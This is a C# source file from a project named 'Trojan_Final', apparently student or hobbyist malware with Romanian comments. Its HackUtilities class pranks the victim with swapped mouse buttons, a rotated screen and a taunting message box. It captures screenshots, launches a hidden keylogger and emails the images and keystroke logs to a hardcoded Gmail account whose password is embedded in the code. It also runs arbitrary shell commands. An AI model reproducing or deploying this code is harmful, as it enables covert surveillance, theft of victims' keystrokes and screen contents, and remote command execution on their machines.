using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Trojan_Final
{
    public class HackUtilities
    {
        //inversare butoane mouse
        [DllImport("user32.dll")]
        public static extern Int32 SwapMouseButton(Int32 bSwap);

        public static void SwapMouseButtons()
        {
            SwapMouseButton(1);
        }

        public static void SwapMouseButtonsBack()
        {
            SwapMouseButton(0);
        }

        //rotire ecran
        public static void RotateScreen(int degrees)
        {
            if (degrees == 0)
                Display.ResetAllRotations();
            else if (degrees == 1)
                Display.Rotate(1, Display.Orientations.DEGREES_CW_90);
            else if (degrees == 2)
                Display.Rotate(1, Display.Orientations.DEGREES_CW_180);
            else if (degrees == 3)
                Display.Rotate(1, Display.Orientations.DEGREES_CW_270);
        }

        //mesaje pe ecran
        public static void ShowOSMessage(string osMessage)
        {
            MessageBox.Show(osMessage, "Teapa fraiere!");
        }

        //captura ecran
        public static void TakeScreenCapture()
        {
            //Create a new bitmap.
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                           Screen.PrimaryScreen.Bounds.Height,
                                           PixelFormat.Format32bppArgb);

            // Create a graphics object from the bitmap.
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

            // Take the screenshot from the upper left corner to the right bottom corner.
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                        Screen.PrimaryScreen.Bounds.Y,
                                        0,
                                        0,
                                        Screen.PrimaryScreen.Bounds.Size,
                                        CopyPixelOperation.SourceCopy);

            // Save the screenshot to the specified path that the user has chosen.
            if (File.Exists("Screenshot.png"))
                File.Delete("Screenshot.png");
            bmpScreenshot.Save("Screenshot.png", ImageFormat.Png);
        }

        public static void SendScreenCapture()
        {
            try
            {
                SmtpClient client = new SmtpClient
                {
                    Host = "smtp.gmail.com",
                    Port = 587,
                    EnableSsl = true,
                    UseDefaultCredentials = false,
                    DeliveryMethod = System.Net.Mail.SmtpDeliveryMethod.Network,
                };
                client.UseDefaultCredentials = false;
                client.Credentials = new NetworkCredential("no.reply.intelservice@gmail.com", "Faniozii");

                MailMessage mailMessage = new MailMessage();


                mailMessage.From = new MailAddress("no.reply.intelservice@gmail.com");
                mailMessage.To.Add("no.reply.intelservice@gmail.com");
                mailMessage.IsBodyHtml = true;

                var inlineLogo = new LinkedResource("Screenshot.png");
                inlineLogo.ContentId = Guid.NewGuid().ToString();

                string body = string.Format(@"
                        <p>Lorum Ipsum Blah Blah</p>
                        <img src=""cid:{0}"" />
                        <p>Lorum Ipsum Blah Blah</p>
                        ", inlineLogo.ContentId);

                var view = AlternateView.CreateAlternateViewFromString(body, null, "text/html");
                view.LinkedResources.Add(inlineLogo);
                mailMessage.AlternateViews.Add(view);

                mailMessage.Subject = "subject";
                client.Send(mailMessage);
            }
            catch (Exception ex)
            {

            }
        }

        public static void RetrieveKeys()
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = "keylogger.exe";
                startInfo.UseShellExecute = true;
                startInfo.CreateNoWindow = true;
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                using (Process proc = Process.Start(startInfo))
                {
                    if (!proc.WaitForExit(1000*60*3))
                        proc.Kill();
                }
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

            try
            {
                SmtpClient client = new SmtpClient
                {
                    Host = "smtp.gmail.com",
                    Port = 587,
                    EnableSsl = true,
                    UseDefaultCredentials = false,
                    DeliveryMethod = System.Net.Mail.SmtpDeliveryMethod.Network,
                };
                client.UseDefaultCredentials = false;
                client.Credentials = new NetworkCredential("no.reply.intelservice@gmail.com", "Faniozii");

                MailMessage mailMessage = new MailMessage();


                mailMessage.From = new MailAddress("no.reply.intelservice@gmail.com");
                mailMessage.To.Add("no.reply.intelservice@gmail.com");
                mailMessage.IsBodyHtml = true;

                var inlineLogo = new LinkedResource("log.txt");
                inlineLogo.ContentId = Guid.NewGuid().ToString();

                string body = string.Format(@"
                        <p>Lorum Ipsum Blah Blah</p>
                        <img src=""cid:{0}"" />
                        <p>Lorum Ipsum Blah Blah</p>
                        ", inlineLogo.ContentId);

                var view = AlternateView.CreateAlternateViewFromString(body, null, "text/html");
                view.LinkedResources.Add(inlineLogo);
                mailMessage.AlternateViews.Add(view);

                mailMessage.Subject = "subject";
                client.Send(mailMessage);
            }
            catch (Exception ex)
            {

            }
        }

        public static string ExecuteCmd(string cmd)
        {
            Process proc = new Process();
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.CreateNoWindow = false;
            proc.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "/c " +  cmd;
            proc.StartInfo.RedirectStandardOutput = true;

            proc.Start();
            var responseString = proc.StandardOutput.ReadToEnd();

            return responseString;
        }

    }
}
